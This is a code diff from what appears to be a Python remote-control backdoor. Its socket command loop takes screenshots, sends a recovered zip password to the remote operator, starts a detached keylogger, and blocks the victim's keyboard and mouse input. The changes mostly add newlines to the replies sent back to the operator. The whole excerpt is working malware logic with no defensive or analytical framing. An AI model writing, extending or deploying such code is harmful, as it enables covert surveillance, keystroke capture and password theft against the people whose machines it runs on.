@@ -26,10 +26,13 @@ def runShell(socketHolder):
 			screenShot()
 		elif data == "OPENZIP":
 			password = openZip()
-			if str(password):
-				socketHolder.send(password)
+			if not password:
+				password = None
+				password = "None"
+				socketHolder.send(password + "\n")
+			else:
+				socketHolder.send(password + "\n")
 		elif data == "EXIT":
-			socketHolder.send('EXIT')
 			socketHolder.close()
 			sys.exit(0)
 		elif data == "LOGKEYSON":
@@ -38,13 +41,13 @@ def runShell(socketHolder):
 			DETACHED_PROCESS = 0x00000008
 			pid = subprocess.Popen([sys.executable, "logKeys.py"],
 				creationflags=DETACHED_PROCESS).pid
-			socketHolder.send('Logger started')
+			socketHolder.send('Logger started\n')
 		elif data == 'BLOCKINPUT':
 			CREATE_NEW_PROCESS_GROUP = 0x00000200
 			DETACHED_PROCESS = 0x00000008
 			pid = subprocess.Popen([sys.executable, "blockInput.py"],
 				creationflags=DETACHED_PROCESS).pid
-			socketHolder.send('Block Input started')
+			socketHolder.send('Block Input started\n')
 		elif len(data) == 0:
 			return True
 		else:
